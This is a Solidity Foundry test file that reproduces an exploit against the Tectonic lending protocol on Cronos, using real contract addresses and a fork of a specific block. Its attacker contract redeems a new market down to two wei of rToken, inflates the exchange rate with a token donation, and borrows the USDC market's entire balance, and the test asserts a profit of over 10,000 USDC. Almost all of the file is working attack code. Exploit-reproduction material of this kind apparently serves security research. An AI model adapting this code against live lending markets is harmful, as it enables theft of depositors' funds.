// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ITectonicComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

interface ITectonicMarket {
    function mint(
        uint256 amount
    ) external returns (uint256);
    function redeem(
        uint256 tokens
    ) external returns (uint256);
    function borrow(
        uint256 amount
    ) external returns (uint256);
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract TectonicAttacker {
    IERC20 private constant NEW_UNDERLYING = IERC20(0x7a7c9db510aB29A2FC362a4c34260BEcB5cE3446);
    IERC20 private constant USDC = IERC20(0xc21223249CA28397B4B6541dfFaEcC539BfF0c59);

    ITectonicComptroller private constant COMPTROLLER =
        ITectonicComptroller(0x8312A8d5d1deC499D00eb28e1a2723b13aA53C1e);
    ITectonicMarket private constant NEW_MARKET = ITectonicMarket(0x131B6F908395f4F43A5A9320B7F96e755df86f8C);
    ITectonicMarket private constant USDC_MARKET = ITectonicMarket(0xf2A4C7595A64A18158D205148A975509d969cB8d);

    function exploit() external {
        address[] memory markets = new address[](1);
        markets[0] = address(NEW_MARKET);
        COMPTROLLER.enterMarkets(markets);

        NEW_UNDERLYING.approve(address(NEW_MARKET), type(uint256).max);
        require(NEW_MARKET.mint(1 ether) == 0, "mint failed");

        // The empty market lets the attacker reduce total supply to two wei of
        // rToken, then inflate their exchange rate by donating the flash loan.
        uint256 rTokens = NEW_MARKET.balanceOf(address(this));
        require(NEW_MARKET.redeem(rTokens - 2) == 0, "redeem failed");
        NEW_UNDERLYING.transfer(address(NEW_MARKET), NEW_UNDERLYING.balanceOf(address(this)));

        require(USDC_MARKET.borrow(USDC.balanceOf(address(USDC_MARKET))) == 0, "borrow failed");
    }
}

contract TectonicExploitTest is Test {
    IERC20 private constant NEW_UNDERLYING = IERC20(0x7a7c9db510aB29A2FC362a4c34260BEcB5cE3446);
    IERC20 private constant USDC = IERC20(0xc21223249CA28397B4B6541dfFaEcC539BfF0c59);

    function testExploit() public {
        vm.createSelectFork("https://cronos.drpc.org", 12_675_282);

        TectonicAttacker attacker = new TectonicAttacker();
        deal(address(NEW_UNDERLYING), address(attacker), 243.5 ether);

        attacker.exploit();

        assertGt(USDC.balanceOf(address(attacker)), 10_000e6);
    }
}
